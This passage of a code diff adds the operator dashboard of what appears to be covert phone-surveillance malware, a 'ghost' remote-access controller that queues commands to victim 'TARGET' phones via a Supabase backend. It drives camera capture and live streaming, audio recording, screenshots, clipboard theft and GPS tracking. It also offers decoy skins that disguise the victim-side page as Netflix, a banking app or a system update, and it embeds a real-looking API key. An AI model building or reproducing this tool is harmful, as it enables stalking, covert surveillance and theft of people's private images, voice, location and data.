+      <div class="cmd-btn p" onclick="sendCmd('light')"><div class="ci">💡</div><div class="cn">Ambient</div><div class="cl">LIGHT LUX</div></div>
+      <div class="cmd-btn c" onclick="sendCmd('clipboard')"><div class="ci">📋</div><div class="cn">Clipboard</div><div class="cl">PASTE</div></div>
+      <div class="cmd-btn c" onclick="sendCmd('screenshot')"><div class="ci">🖥️</div><div class="cn">Screenshot</div><div class="cl">SCREEN</div></div>
+      <div class="cmd-btn c" onclick="sendCmd('status')"><div class="ci">📊</div><div class="cn">Full Status</div><div class="cl">INFO</div></div>
+    </div>
+  </div>
+
+  <!-- Control -->
+  <div class="cmd-cat">
+    <div class="cmd-cat-title">⚡ CONTROL</div>
+    <div class="cmd-grid">
+      <div class="cmd-btn gd" onclick="sendCmd('vibrate')"><div class="ci">📳</div><div class="cn">Vibrate</div><div class="cl">BUZZ</div></div>
+      <div class="cmd-btn gd" onclick="sendCmd('vibrate_sos')"><div class="ci">🆘</div><div class="cn">SOS Pattern</div><div class="cl">SOS</div></div>
+      <div class="cmd-btn gd" onclick="sendCmdP('speak','Hello World')"><div class="ci">🔊</div><div class="cn">Speak Text</div><div class="cl">TTS</div></div>
+      <div class="cmd-btn gd" onclick="sendCmd('flash')"><div class="ci">⚡</div><div class="cn">Flash Screen</div><div class="cl">FLASH</div></div>
+      <div class="cmd-btn w" onclick="promptSpeak()"><div class="ci">💬</div><div class="cn">Custom TTS</div><div class="cl">TYPE MSG</div></div>
+      <div class="cmd-btn w" onclick="promptAlert()"><div class="ci">🚨</div><div class="cn">Alert Popup</div><div class="cl">ALERT</div></div>
+      <div class="cmd-btn r" onclick="sendCmd('lock')"><div class="ci">🔒</div><div class="cn">Lock Screen</div><div class="cl">LOCK</div></div>
+      <div class="cmd-btn g" onclick="sendCmd('unlock')"><div class="ci">🔓</div><div class="cn">Unlock</div><div class="cl">UNLOCK</div></div>
+      <div class="cmd-btn c" onclick="sendCmd('ping')"><div class="ci">🏓</div><div class="cn">Ping</div><div class="cl">PING</div></div>
+      <div class="cmd-btn c" onclick="sendCmd('reload')"><div class="ci">🔄</div><div class="cn">Reload</div><div class="cl">RELOAD</div></div>
+    </div>
+  </div>
+
+  <!-- Screen FX -->
+  <div class="cmd-cat">
+    <div class="cmd-cat-title">🎨 SCREEN FX</div>
+    <div class="cmd-grid tri">
+      <div class="cmd-btn pk" onclick="sendCmd('dim')"><div class="ci">🌑</div><div class="cn">Dim</div><div class="cl">DIM</div></div>
+      <div class="cmd-btn pk" onclick="sendCmd('brighten')"><div class="ci">☀️</div><div class="cn">Brighten</div><div class="cl">BRIGHT</div></div>
+      <div class="cmd-btn pk" onclick="sendCmd('invert')"><div class="ci">🔄</div><div class="cn">Invert</div><div class="cl">INVERT</div></div>
+      <div class="cmd-btn pk" onclick="sendCmd('grayscale')"><div class="ci">🎞️</div><div class="cn">Grayscale</div><div class="cl">MONO</div></div>
+      <div class="cmd-btn pk" onclick="sendCmd('blur_screen')"><div class="ci">🌫️</div><div class="cn">Blur</div><div class="cl">BLUR</div></div>
+      <div class="cmd-btn g" onclick="sendCmd('clear_fx')"><div class="ci">✨</div><div class="cn">Clear FX</div><div class="cl">RESET</div></div>
+    </div>
+  </div>
+
+</div><!-- /panel-cmd -->
+
+<!-- ════════════════════════ PANEL: DECOY SKINS -->
+<div class="panel" id="panel-decoy">
+  <div class="sec gap">CAMOUFLAGE SKINS</div>
+  <div class="decoy-grid">
+    <div class="decoy-card netflix" onclick="sendCmd('decoy_netflix')">
+      <div class="dc-icon">🎬</div>
+      <div class="dc-name">Netflix</div>
+      <div class="dc-cmd">decoy_netflix</div>
+    </div>
+    <div class="decoy-card docs" onclick="sendCmd('decoy_docs')">
+      <div class="dc-icon">📄</div>
+      <div class="dc-name">DocuShare</div>
+      <div class="dc-cmd">decoy_docs</div>
+    </div>
+    <div class="decoy-card bank" onclick="sendCmd('decoy_bank')">
+      <div class="dc-icon">🏦</div>
+      <div class="dc-name">Banking App</div>
+      <div class="dc-cmd">decoy_bank</div>
+    </div>
+    <div class="decoy-card update" onclick="sendCmd('decoy_update')">
+      <div class="dc-icon">📱</div>
+      <div class="dc-name">System Update</div>
+      <div class="dc-cmd">decoy_update</div>
+    </div>
+    <div class="decoy-card maps" onclick="sendCmd('decoy_maps')">
+      <div class="dc-icon">🗺️</div>
+      <div class="dc-name">Google Maps</div>
+      <div class="dc-cmd">decoy_maps</div>
+    </div>
+    <div class="decoy-card photo" onclick="sendCmd('decoy_photo')">
+      <div class="dc-icon">🖼️</div>
+      <div class="dc-name">Photo Gallery</div>
+      <div class="dc-cmd">decoy_photo</div>
+    </div>
+  </div>
+  <div class="cmd-cat" style="margin-top:8px">
+    <div class="cmd-cat-title">VISIBILITY</div>
+    <div class="cmd-grid">
+      <div class="cmd-btn g" onclick="sendCmd('show_decoy')"><div class="ci">👁️</div><div class="cn">Show Decoy</div><div class="cl">SHOW</div></div>
+      <div class="cmd-btn w" onclick="sendCmd('hide_decoy')"><div class="ci">🙈</div><div class="cn">Hide Decoy</div><div class="cl">HIDE</div></div>
+    </div>
+  </div>
+</div>
+
+<!-- ════════════════════════ PANEL: LIVE STREAM -->
+<div class="panel" id="panel-live">
+  <div class="live-status-bar">
+    <div class="live-indicator off" id="liveStatusInd">⬤ NOT STREAMING</div>
+    <div id="liveDevInfo" style="font-size:9px;color:var(--muted)">—</div>
+  </div>
+  <div class="live-viewport" id="liveViewport">
+    <div class="live-placeholder">📡<br><br>Send LIVE or LIVE_FRONT<br>to start the stream</div>
+  </div>
+  <div class="live-cmds">
+    <div class="live-btn r" onclick="sendCmdP('live','2')">🔴 Rear</div>
+    <div class="live-btn r" onclick="sendCmdP('live_front','2')">📡 Front</div>
+    <div class="live-btn g" onclick="sendCmd('live_stop')">⏹ Stop</div>
+    <div class="live-btn c" onclick="sendCmdP('live','1')">1 FPS</div>
+    <div class="live-btn c" onclick="sendCmdP('live','3')">3 FPS</div>
+    <div class="live-btn c" onclick="sendCmdP('live','5')">5 FPS</div>
+  </div>
+</div>
+
+<!-- ════════════════════════ PANEL: GALLERY -->
+<div class="panel" id="panel-gallery">
+  <div class="gallery-bar">
+    <select class="gallery-sel" id="galFilter" onchange="loadGallery()">
+      <option value="all">All Types</option>
+      <option value="capture">📸 Rear Photos</option>
+      <option value="selfie">🤳 Selfies</option>
+      <option value="timelapse_frame">📽️ Timelapse</option>
+      <option value="video">🎥 Videos</option>
+      <option value="audio">🎤 Audio</option>
+      <option value="screenshot">🖥️ Screenshots</option>
+    </select>
+    <button class="gallery-ref" onclick="loadGallery()">↺</button>
+  </div>
+  <div class="gallery-cnt" id="galCnt">Loading…</div>
+  <div class="gallery-grid" id="galGrid"><div class="gallery-empty">No media yet</div></div>
+</div>
+
+<!-- ════════════════════════ PANEL: MAP -->
+<div class="panel" id="panel-map">
+  <div class="sec gap">LAST KNOWN LOCATION</div>
+  <div class="map-frame" id="mapFrame">
+    <div class="map-placeholder">📍<br><br>Send LOCATION command<br>to see device on map</div>
+  </div>
+  <div class="loc-info" id="locInfo" style="display:none">
+    <div class="loc-row"><span class="loc-lbl">LAT</span><span class="loc-val" id="locLat">—</span></div>
+    <div class="loc-row"><span class="loc-lbl">LNG</span><span class="loc-val" id="locLng">—</span></div>
+    <div class="loc-row"><span class="loc-lbl">ACCURACY</span><span class="loc-val" id="locAcc">—</span></div>
+    <div class="loc-row"><span class="loc-lbl">SPEED</span><span class="loc-val" id="locSpd">—</span></div>
+    <div class="loc-row"><span class="loc-lbl">TIME</span><span class="loc-val" id="locTime">—</span></div>
+    <div class="loc-row" style="border:none;margin:0;padding:0"><a id="locMapsLink" href="#" target="_blank" style="font-size:10px;color:var(--cyan)">↗ Open in Maps</a></div>
+  </div>
+  <div style="margin-top:10px">
+    <div class="cmd-grid">
+      <div class="cmd-btn g" onclick="sendCmd('location')"><div class="ci">📍</div><div class="cn">Refresh GPS</div><div class="cl">LOCATION</div></div>
+      <div class="cmd-btn g" onclick="sendCmdP('track_start','10')"><div class="ci">🗺️</div><div class="cn">Auto Track</div><div class="cl">EVERY 10s</div></div>
+      <div class="cmd-btn w" onclick="sendCmd('track_stop')"><div class="ci">🛑</div><div class="cn">Stop Track</div><div class="cl">STOP</div></div>
+    </div>
+  </div>
+</div>
+
+<!-- ════════════════════════ PANEL: DEVICES -->
+<div class="panel" id="panel-devices">
+  <div class="dev-stats">
+    <div class="dev-stat"><div class="dev-stat-n" id="devOnline">0</div><div class="dev-stat-l">ONLINE</div></div>
+    <div class="dev-stat"><div class="dev-stat-n" id="devTotal">0</div><div class="dev-stat-l">TOTAL</div></div>
+  </div>
+  <div class="sec gap">REGISTERED DEVICES</div>
+  <div class="dev-list" id="devList"><div class="no-devs">No devices yet.<br>Open the TARGET file on another phone.</div></div>
+</div>
+
+<!-- ════════════════════════ PANEL: FEED -->
+<div class="panel" id="panel-feed">
+  <div class="feed-wrap">
+    <div class="feed-hdr">
+      <span>LIVE FEED</span>
+      <button class="clr-btn" onclick="clearFeed()">CLEAR</button>
+    </div>
+    <div class="feed-list" id="feedList"><div style="padding:24px;text-align:center;color:var(--muted);font-size:11px">Waiting for data…</div></div>
+  </div>
+</div>
+
+<!-- IMAGE VIEWER -->
+<div id="imgViewer">
+  <button class="iv-close" onclick="closeViewer()">✕</button>
+  <img id="ivImg" src="" alt="">
+  <button class="iv-dl" onclick="downloadViewerImg()">⬇ Download</button>
+</div>
+
+<!-- STATUS BAR -->
+<div class="status-bar">
+  <span>👁 <span id="sbTarget">ALL</span></span>
+  <span id="sbTime">--:--:--</span>
+  <span>v5.0</span>
+</div>
+
+<script>
+// ═══════════════════════════════════════════════════════
+//  CONFIG
+// ═══════════════════════════════════════════════════════
+const SUPABASE_URL = 'https://muyevssqiuvhcozgxtlp.supabase.co';
+const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im11eWV2c3NxaXV2aGNvemd4dGxwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg0MTE4NTQsImV4cCI6MjA5Mzk4Nzg1NH0.jzN6V1UArKq5epxK3tTXuo1cGukH5oKD9qAi1FQWGUU';
+const HDR = { 'apikey': SUPABASE_KEY, 'Authorization': 'Bearer ' + SUPABASE_KEY, 'Content-Type': 'application/json' };
+const LOCK_CODE = '1234'; // ← CHANGE THIS
+
+// ═══════════════════════════════════════════════════════
+//  STATE
+// ═══════════════════════════════════════════════════════
+let selectedDeviceId = null;
+let targetMode       = 'all';
+let lastResultId     = 0;
+let newPhotoCnt      = 0;
+let newFeedCnt       = 0;
+let lastLat = null, lastLng = null;
+let liveStreamActive = false;
+let viewerImgData    = null;
+
+// ── FIX: image src cache — store base64 by index to avoid inline onclick attr issues ──
+const _imgCache = {};
+let   _imgCacheIdx = 0;
+
+function cacheImg(data) {
+  const key = 'img_' + (++_imgCacheIdx);
+  _imgCache[key] = data;
+  return key;
+}
+function openViewerCached(key) {
+  openViewer(_imgCache[key]);
+}
+
+// ═══════════════════════════════════════════════════════
+//  LOCK SCREEN
+// ═══════════════════════════════════════════════════════
+let lkBuf = '';
+function lkTap(d) {
+  if (lkBuf.length >= 4) return;
+  lkBuf += d;
+  document.getElementById('d' + (lkBuf.length - 1)).classList.add('filled');
+  if (lkBuf.length === 4) {
+    if (lkBuf === LOCK_CODE) {
+      document.getElementById('lockScreen').classList.add('unlocked');
+      bootstrap();
+    } else {
+      document.querySelectorAll('.lock-dot').forEach(d => { d.classList.remove('filled'); d.classList.add('error'); });
+      document.getElementById('lockErr').textContent = 'WRONG CODE';
+      setTimeout(() => {
+        document.querySelectorAll('.lock-dot').forEach(d => d.classList.remove('error'));
+        document.getElementById('lockErr').textContent = '';
+        lkBuf = '';
+      }, 700);
+    }
+  }
+}
+function lkDel() {
+  if (!lkBuf.length) return;
+  document.getElementById('d' + (lkBuf.length - 1)).classList.remove('filled');
+  lkBuf = lkBuf.slice(0, -1);
+}
+
+// ═══════════════════════════════════════════════════════
+//  SUPABASE HELPERS
+// ═══════════════════════════════════════════════════════
+async function dbSelect(t, qs) {
+  try {
+    const r = await fetch(`${SUPABASE_URL}/rest/v1/${t}?${qs}`, { headers: HDR });
+    if (!r.ok) return [];
+    return await r.json();
+  } catch(e) { return []; }
+}
+async function dbInsert(t, row) {
+  try {
+    const r = await fetch(`${SUPABASE_URL}/rest/v1/${t}`, {
+      method: 'POST', headers: { ...HDR, 'Prefer': 'return=minimal' }, body: JSON.stringify(row)
+    });
+    return r.ok;
+  } catch(e) { return false; }
+}
+
+// ═══════════════════════════════════════════════════════
+//  SEND COMMAND
+// ═══════════════════════════════════════════════════════
+async function sendCmd(command, param) {
+  param = param !== undefined ? String(param) : '';
+  const devId = targetMode === 'all' ? 'all' : (selectedDeviceId || 'all');
+  const ok = await dbInsert('ghost_commands', {
+    device_id:  devId,
+    command,
+    param,
+    executed:   false,
+    created_at: new Date().toISOString()
+  });
+  showToast(ok ? `▶ ${command}${param ? ' :' + param : ''}` : '✗ DB error');
+}
+function sendCmdP(command, param) { sendCmd(command, param); }
+function sendCmdDur(command) {
+  const dur  = document.getElementById('durParam')?.value?.trim()   || '';
+  const brst = document.getElementById('burstParam')?.value?.trim() || '';
+  if (command.includes('burst')) { sendCmd(command, brst || '3'); }
+  else { sendCmd(command, dur || '10'); }
+}
+function sendCustom() {
+  const cmd   = document.getElementById('cmdIn')?.value?.trim();
+  const param = document.getElementById('paramIn')?.value?.trim() || '';
+  if (!cmd) return showToast('Enter a command');
+  sendCmd(cmd, param);
+}
+function promptSpeak() {
+  const txt = prompt('Text to speak:');
+  if (txt) sendCmd('speak', txt);
+}
+function promptAlert() {
+  const txt = prompt('Alert message:');
+  if (txt) sendCmd('alert', txt);
+}
+
+// ═══════════════════════════════════════════════════════
+//  TARGET SELECTION
+// ═══════════════════════════════════════════════════════
+function setTarget(mode) {
+  targetMode = mode;
+  document.getElementById('tc-all').classList.toggle('active', mode === 'all');
+  document.getElementById('tc-sel').classList.toggle('active', mode === 'selected');
+  document.getElementById('sbTarget').textContent = mode === 'all' ? 'ALL' : (selectedDeviceId || 'NONE').slice(0, 12);
+}
+function selectDevice(id) {
+  selectedDeviceId = id;
+  setTarget('selected');
+  document.getElementById('tc-sel-txt').textContent = id.replace('device_', '').slice(0, 9);
+  document.querySelectorAll('.dev-chip').forEach(c => c.classList.toggle('selected', c.dataset.id === id));
+  document.querySelectorAll('.dev-card').forEach(c => c.classList.toggle('selected', c.dataset.id === id));
+  showToast('Target: ' + id.slice(0, 16));
+}
+
+// ═══════════════════════════════════════════════════════
+//  TABS
+// ═══════════════════════════════════════════════════════
+function showTab(name) {
+  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  const panel = document.getElementById('panel-' + name);
+  const tab   = document.getElementById('tab-'   + name);
+  if (panel) panel.classList.add('active');
+  if (tab)   tab.classList.add('active');
+  if (name === 'gallery') { loadGallery(); newPhotoCnt = 0; const b = document.getElementById('galBadge'); if (b) { b.style.display = 'none'; b.textContent = ''; } }
+  if (name === 'feed')    { newFeedCnt  = 0; const b = document.getElementById('feedBadge'); if (b) { b.style.display = 'none'; b.textContent = ''; } }
+  if (name === 'devices') { pollDevices(); }
+  if (name === 'map')     { checkMapData(); }
+}
+
+// ═══════════════════════════════════════════════════════
+//  FEED RENDERING
+// ═══════════════════════════════════════════════════════
+function renderFeedItem(r) {
+  const list = document.getElementById('feedList');
+  if (!list) return;
+  const first = list.querySelector('[data-placeholder]');
+  if (first) first.remove();
+
+  let payload = {};
+  try { payload = JSON.parse(r.payload); } catch(e) {}
+
+  const ts   = new Date(r.created_at).toLocaleTimeString();
+  const dev  = (r.device_id || '').replace('device_', '').slice(0, 12);
+  const type = r.type || 'data';
+
+  const item = document.createElement('div');
+  item.className = 'f-item';
+
+  let bodyHtml = '';
+
+  if (['capture', 'selfie', 'screenshot', 'timelapse_frame'].includes(type) && payload.image) {
+    // ── FIX: don't embed full base64 in onclick attr — use cache key instead ──
+    const key = cacheImg(payload.image);
+    bodyHtml = `<img class="f-img" src="${payload.image}" onclick="openViewerCached('${key}')" alt="${type}">`;
+    if (payload.w) bodyHtml += `<div style="font-size:8px;color:var(--muted);margin-top:4px">${payload.w}×${payload.h}${payload.burst ? ' · Burst ' + payload.shot + '/' + payload.total : ''}</div>`;
+    newPhotoCnt++;
+    const b = document.getElementById('galBadge');
+    if (b && !document.getElementById('panel-gallery').classList.contains('active')) {
+      b.style.display = 'inline'; b.textContent = '+' + newPhotoCnt;
+    }
+  } else if (type === 'audio' && payload.audio) {
+    bodyHtml = `<audio class="f-audio" controls src="${payload.audio}"></audio>`;
+    if (payload.duration) bodyHtml += `<div style="font-size:8px;color:var(--muted);margin-top:3px">${payload.duration}s · ${payload.size_kb || '?'} KB</div>`;
+  } else if ((type === 'location' || type === 'location_track') && payload.lat) {
+    bodyHtml = `<div class="f-body">📍 ${payload.lat?.toFixed(6)}, ${payload.lng?.toFixed(6)}<br>⚡ Accuracy: ${payload.accuracy?.toFixed(0)}m</div>`;
+    if (payload.maps) bodyHtml += `<a class="f-map-link" href="${payload.maps}" target="_blank">↗ Open in Google Maps</a>`;
+    updateMapPanel(payload);
+  } else if (type === 'live_frame') {
+    updateLiveFrame(payload);
+    return; // don't add live frames to feed — too noisy
+  } else {
+    bodyHtml = `<pre>${JSON.stringify(payload, null, 2)}</pre>`;
+  }
+
+  item.innerHTML = `
+    <div class="f-meta">
+      <span class="f-badge ${type}">${type.toUpperCase()}</span>
+      <span class="f-time">${ts}</span>
+    </div>
+    <div class="f-dev">DEV: ${dev}</div>
+    <div class="f-body">${bodyHtml}</div>
+  `;
+  list.prepend(item);
+
+  if (!document.getElementById('panel-feed').classList.contains('active')) {
+    newFeedCnt++;
+    const b = document.getElementById('feedBadge');
+    if (b) { b.style.display = 'inline'; b.textContent = newFeedCnt > 9 ? '9+' : String(newFeedCnt); }
+  }
+}
+
+function clearFeed() {
+  const list = document.getElementById('feedList');
+  if (list) list.innerHTML = '<div style="padding:24px;text-align:center;color:var(--muted);font-size:11px" data-placeholder>Feed cleared</div>';
+  newFeedCnt = 0;
+  const b = document.getElementById('feedBadge');
+  if (b) { b.style.display = 'none'; b.textContent = ''; }
+}
+
+// ═══════════════════════════════════════════════════════
+//  LIVE FRAME HANDLER
+// ═══════════════════════════════════════════════════════
+function updateLiveFrame(payload) {
+  if (!payload.frame) return;
+  const vp = document.getElementById('liveViewport');
+  if (!vp) return;
+  let img = vp.querySelector('img#liveStreamImg');
+  if (!img) {
+    vp.innerHTML = '';
+    img = document.createElement('img');
+    img.id = 'liveStreamImg';
+    img.style.cssText = 'width:100%;height:100%;object-fit:cover';
+    const badge = document.createElement('div');
+    badge.className = 'live-overlay-badge';
+    badge.textContent = '🔴 LIVE';
+    const fpsBadge = document.createElement('div');
+    fpsBadge.className = 'live-fps-badge';
+    fpsBadge.id = 'liveFpsBadge';
+    fpsBadge.textContent = payload.w ? `${payload.w}×${payload.h}` : 'LIVE';
+    vp.appendChild(img);
+    vp.appendChild(badge);
+    vp.appendChild(fpsBadge);
+  }
+  img.src = payload.frame;
+  liveStreamActive = true;
+  // ── FIX: guard each element access safely ──
+  const ind  = document.getElementById('liveStatusInd');
+  const badge = document.getElementById('liveBadge');
+  const tab  = document.getElementById('tab-live');
+  if (ind)   { ind.textContent = '⬤ LIVE STREAMING'; ind.classList.remove('off'); }
+  if (badge) badge.style.display = 'inline';
+  if (tab)   tab.classList.add('red-tab');
+}
+
+// ═══════════════════════════════════════════════════════
+//  GALLERY
+// ═══════════════════════════════════════════════════════
+async function loadGallery() {
+  const filter = document.getElementById('galFilter')?.value || 'all';
+  const qs = filter === 'all'
+    ? `type=in.(capture,selfie,screenshot,timelapse_frame,video,audio)&order=id.desc&limit=40`
+    : `type=eq.${filter}&order=id.desc&limit=40`;
+  const rows = await dbSelect('ghost_results', qs);
+  const grid = document.getElementById('galGrid');
+  const cnt  = document.getElementById('galCnt');
+  if (!grid) return;
+  if (!rows?.length) {
+    grid.innerHTML = '<div class="gallery-empty">No media captured yet</div>';
+    if (cnt) cnt.textContent = '0 items';
+    return;
+  }
+  if (cnt) cnt.textContent = rows.length + ' item' + (rows.length !== 1 ? 's' : '');
+  grid.innerHTML = '';
+  window._galleryRows = rows;
+  rows.forEach(r => {
+    let payload = {};
+    try { payload = JSON.parse(r.payload); } catch(e) {}
+    const ts  = new Date(r.created_at).toLocaleTimeString();
+    const dev = (r.device_id || '').replace('device_', '').slice(0, 10);
+    const item = document.createElement('div');
+    item.className = 'g-item';
+    const typeColors = { capture: 'var(--purple)', selfie: 'var(--purple)', screenshot: 'var(--cyan)', timelapse_frame: 'var(--gold)', video: 'var(--orange)', audio: 'var(--warn)' };
+    const col = typeColors[r.type] || 'var(--cyan)';
+    let mediaHtml = '';
+    // ── FIX: use cache key for image onclick to avoid attr-encoded base64 ──
+    if (['capture', 'selfie', 'screenshot', 'timelapse_frame'].includes(r.type) && payload.image) {
+      const key = cacheImg(payload.image);
+      mediaHtml = `<img src="${payload.image}" onclick="openViewerCached('${key}')" style="width:100%;aspect-ratio:4/3;object-fit:cover;display:block;cursor:pointer">`;
+    } else if (r.type === 'audio' && payload.audio) {
+      mediaHtml = `<div style="background:var(--card);padding:12px;display:flex;align-items:center;justify-content:center;aspect-ratio:4/3;font-size:32px">🎤</div>`;
+    } else if (r.type === 'video' && payload.video) {
+      mediaHtml = `<div style="background:var(--card);padding:12px;display:flex;align-items:center;justify-content:center;aspect-ratio:4/3;font-size:32px">🎥</div>`;
+    } else {
+      mediaHtml = `<div style="background:var(--card);padding:12px;display:flex;align-items:center;justify-content:center;aspect-ratio:4/3;font-size:28px">📦</div>`;
+    }
+    item.innerHTML = `
+      ${mediaHtml}
+      <div class="g-item-info">
+        <div class="g-type" style="color:${col}">${r.type.toUpperCase()}</div>
+        <div class="g-time">${ts}</div>
+        <div class="g-dev">${dev}</div>
+      </div>
+      <button class="g-dl-btn" onclick="downloadItem(${r.id})">⬇ DOWNLOAD</button>`;
+    grid.appendChild(item);
+  });
+}
+
+function downloadItem(id) {
+  const rows = window._galleryRows || [];
+  const r = rows.find(x => x.id === id);
+  if (!r) return;
+  let payload = {};
+  try { payload = JSON.parse(r.payload); } catch(e) {}
+  const data = payload.image || payload.audio || payload.video;
+  if (!data) return showToast('No downloadable data');
+  const a = document.createElement('a');
+  a.href = data;
+  const ext = data.startsWith('data:video') ? 'webm' : data.startsWith('data:audio') ? 'webm' : 'jpg';
+  a.download = `ghost_${r.type}_${id}.${ext}`;
+  a.click();
+}
+
+// ═══════════════════════════════════════════════════════
+//  IMAGE VIEWER
+// ═══════════════════════════════════════════════════════
+function openViewer(src) {
+  viewerImgData = src;
+  const img = document.getElementById('ivImg');
+  const viewer = document.getElementById('imgViewer');
+  if (img)    img.src = src;
+  if (viewer) viewer.classList.add('open');
+}
+function closeViewer() {
+  const viewer = document.getElementById('imgViewer');
+  if (viewer) viewer.classList.remove('open');
+}
+function downloadViewerImg() {
+  if (!viewerImgData) return;
+  const a = document.createElement('a');
+  a.href = viewerImgData;
+  a.download = 'ghost_capture_' + Date.now() + '.jpg';
+  a.click();
+}
+
+// ═══════════════════════════════════════════════════════
+//  MAP PANEL
+// ═══════════════════════════════════════════════════════
+function updateMapPanel(payload) {
+  if (!payload.lat) return;
+  lastLat = payload.lat; lastLng = payload.lng;
+  const frame = document.getElementById('mapFrame');
+  const info  = document.getElementById('locInfo');
+  if (frame) {
+    frame.innerHTML = `<iframe
+      width="100%" height="100%" frameborder="0" style="border:0"
+      src="https://maps.google.com/maps?q=${payload.lat},${payload.lng}&z=15&output=embed"
+      allowfullscreen loading="lazy"></iframe>`;
+  }
+  if (info) {
+    info.style.display = 'block';
+    const safe = id => document.getElementById(id);
+    if (safe('locLat'))  safe('locLat').textContent  = payload.lat?.toFixed(6);
+    if (safe('locLng'))  safe('locLng').textContent  = payload.lng?.toFixed(6);
+    if (safe('locAcc'))  safe('locAcc').textContent  = payload.accuracy ? payload.accuracy.toFixed(0) + 'm' : '—';
+    if (safe('locSpd'))  safe('locSpd').textContent  = payload.speed ? payload.speed.toFixed(1) + ' m/s' : '—';
+    if (safe('locTime')) safe('locTime').textContent = new Date().toLocaleTimeString();
+    const link = safe('locMapsLink');
+    if (link) link.href = payload.maps || `https://maps.google.com/?q=${payload.lat},${payload.lng}`;
+  }
+}
+
+async function checkMapData() {
+  if (lastLat) return;
+  const rows = await dbSelect('ghost_results', 'type=in.(location,location_track)&order=id.desc&limit=1');
+  if (rows?.length) {
+    try { const p = JSON.parse(rows[0].payload); if (p.lat) updateMapPanel(p); } catch(e) {}
+  }
+}
+
+// ═══════════════════════════════════════════════════════
+//  DEVICE POLLING
+// ═══════════════════════════════════════════════════════
+async function pollDevices() {
+  const devs = await dbSelect('ghost_devices', 'order=last_seen.desc&limit=20');
+  const bar  = document.getElementById('devBar');
+  const list = document.getElementById('devList');
+
+  if (bar) {
+    bar.innerHTML = '';
+    if (!devs?.length) { bar.innerHTML = '<div class="dev-empty">No devices</div>'; }
+    else devs.forEach(d => {
+      const age    = Math.floor((Date.now() - new Date(d.last_seen)) / 1000);
+      const online = age < 50;
+      const isLive = d.live_active === true;
+      // ── FIX: removed double-space in class string that broke CSS matching ──
+      const cls = ['dev-chip', online ? 'online' : 'offline', d.device_id === selectedDeviceId ? 'selected' : '', isLive ? 'live' : ''].filter(Boolean).join(' ');
+      const short = (d.device_id || '').replace('device_', '');
+      const chip = document.createElement('div');
+      chip.className = cls; chip.dataset.id = d.device_id;
+      chip.onclick = () => selectDevice(d.device_id);
+      chip.innerHTML = `<div class="cdot"></div>${short.slice(0, 8)}${isLive ? '🔴' : ''}`;
+      bar.appendChild(chip);
+    });
+  }
+
+  if (list) {
+    if (!devs?.length) { list.innerHTML = '<div class="no-devs">No devices registered yet.<br>Open the TARGET file on another phone.</div>'; return; }
+    let online = 0;
+    list.innerHTML = '';
+    devs.forEach(d => {
+      const age    = Math.floor((Date.now() - new Date(d.last_seen)) / 1000);
+      const isOnln = age < 50;
+      const isLive = d.live_active === true;
+      if (isOnln) online++;
+      const timeStr = age < 60 ? age + 's ago' : age < 3600 ? Math.floor(age / 60) + 'm ago' : Math.floor(age / 3600) + 'h ago';
+      const short   = (d.device_id || '').replace('device_', '');
+      const isSel   = d.device_id === selectedDeviceId;
+      let batStr = '';
+      if (d.battery) { try { const b = JSON.parse(d.battery); batStr = b.level ? '🔋 ' + b.level + (b.charging ? ' ⚡' : '') : ''; } catch(e) {} }
+      let info = '';
+      if (d.info) { try { const i = JSON.parse(d.info); info = i.screen || ''; } catch(e) {} }
+      const cls = ['dev-card', isOnln ? 'online' : '', isSel ? 'selected' : '', isLive ? 'live-on' : ''].filter(Boolean).join(' ');
+      const card = document.createElement('div');
+      card.className = cls; card.dataset.id = d.device_id;
+      card.onclick = () => selectDevice(d.device_id);
+      card.innerHTML = `
+        <span class="dev-icon">${isLive ? '📹' : isOnln ? '📱' : '💀'}</span>
+        <div style="flex:1;min-width:0">
+          <div class="dev-id">${short.slice(0, 18)}</div>
+          <div class="dev-seen">Last: ${timeStr}${info ? ' · ' + info : ''}</div>
+          ${batStr ? '<div class="dev-bat">' + batStr + '</div>' : ''}
+        </div>
+        <div class="dev-pill ${isOnln ? (isLive ? 'live-pill' : '') : 'offline'}">${isLive ? '🔴 LIVE' : isOnln ? 'ONLINE' : 'OFFLINE'}</div>`;
+      list.appendChild(card);
+    });
+    const onEl  = document.getElementById('devOnline');
+    const totEl = document.getElementById('devTotal');
+    if (onEl)  onEl.textContent  = online;
+    if (totEl) totEl.textContent = devs.length;
+  }
+}
+
+// ═══════════════════════════════════════════════════════
+//  RESULT POLLING — filtered by selected device if in selected mode
+// ═══════════════════════════════════════════════════════
+async function pollResults() {
+  // ── FIX: optionally filter results to selected device ──
+  let qs = `id=gt.${lastResultId}&order=id.asc&limit=30`;
+  if (targetMode === 'selected' && selectedDeviceId) {
+    qs = `device_id=eq.${encodeURIComponent(selectedDeviceId)}&` + qs;
+  }
+  const rows = await dbSelect('ghost_results', qs);
+  if (!rows?.length) return;
+  rows.forEach(r => {
+    renderFeedItem(r);
+    if (r.id > lastResultId) lastResultId = r.id;
+  });
+  // Handle live_stop signal
+  const liveStop = rows.find(r => r.type === 'live_status');
+  if (liveStop) {
+    try {
+      const p = JSON.parse(liveStop.payload);
+      if (p.status === 'stopped') {
+        liveStreamActive = false;
+        const ind   = document.getElementById('liveStatusInd');
+        const badge = document.getElementById('liveBadge');
+        const tab   = document.getElementById('tab-live');
+        if (ind)   { ind.textContent = '⬤ NOT STREAMING'; ind.classList.add('off'); }
+        if (badge) badge.style.display = 'none';
+        if (tab)   tab.classList.remove('red-tab');
+      }
+    } catch(e) {}
+  }
+}
+
+// ═══════════════════════════════════════════════════════
+//  CONNECTION CHECK
+// ═══════════════════════════════════════════════════════
+async function checkConn() {
+  const dot = document.getElementById('liveDot');
+  const txt = document.getElementById('connTxt');
+  try {
+    const r = await fetch(SUPABASE_URL + '/rest/v1/ghost_devices?limit=1', { headers: HDR });
+    if (txt) txt.textContent = r.ok ? 'LIVE' : 'DB ERR';
+    if (dot) dot.classList.toggle('err', !r.ok);
+  } catch(e) {
+    if (txt) txt.textContent = 'OFFLINE';
+    if (dot) dot.classList.add('err');
+  }
+}
+
+// ═══════════════════════════════════════════════════════
+//  CLOCK
+// ═══════════════════════════════════════════════════════
+function updateClock() {
+  const el = document.getElementById('sbTime');
+  if (el) el.textContent = new Date().toLocaleTimeString();
+}
+
+// ═══════════════════════════════════════════════════════
+//  TOAST
